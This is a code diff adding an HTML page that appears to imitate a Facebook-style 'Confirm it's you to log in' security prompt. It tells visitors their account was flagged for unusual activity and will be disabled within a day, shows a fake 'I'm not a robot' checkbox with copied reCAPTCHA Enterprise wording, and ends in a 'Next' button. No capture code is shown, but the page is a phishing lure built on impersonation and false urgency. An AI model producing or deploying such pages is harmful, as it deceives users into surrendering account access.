@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm Login</title>
+    <style>
+        /* Container styling */
+        .container {
+            width: 400px;
+            margin: 50px auto;
+            background-color: #ffffff;
+            border: 1px solid #dcdcdc;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+            font-family: Arial, sans-serif;
+        }
+
+        /* Title styling */
+        .container h2 {
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        /* Subtitle styling */
+        .container p {
+            font-size: 14px;
+            color: #606770;
+            text-align: center;
+            margin: 5px 0 15px;
+        }
+
+        /* reCAPTCHA box styling */
+        .recaptcha {
+            margin: 20px auto;
+            background-color: #f9f9f9;
+            border: 1px solid #dcdcdc;
+            border-radius: 5px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        /* Description text styling */
+        .description {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 10px;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        /* Button styling */
+        .next-button {
+            background-color: #1877f2;
+            color: white;
+            width: 100%;
+            padding: 12px 0;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+
+        /* Button hover effect */
+        .next-button:hover {
+            background-color: #165dc1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Confirm it's you to log in</h2>
+        <p>We noticed unusual activity from your account, so we've logged you out.</p>
+        <p>Follow the next steps within 1 day so we can try to get you back into your account before it's disabled.</p>
+
+        <div class="recaptcha">
+            <label>
+                <input type="checkbox" style="transform: scale(1.5); margin-right: 10px;" /> I'm not a robot
+            </label>
+            <p style="font-size: 12px;">reCAPTCHA Privacy - Terms</p>
+        </div>
+
+        <div class="description">
+            This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.
+            <br><br>
+            We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
+            <br><br>
+            reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
+        </div>
+
+        <button class="next-button">Next</button>
+    </div>
+
+</body>
+</html>
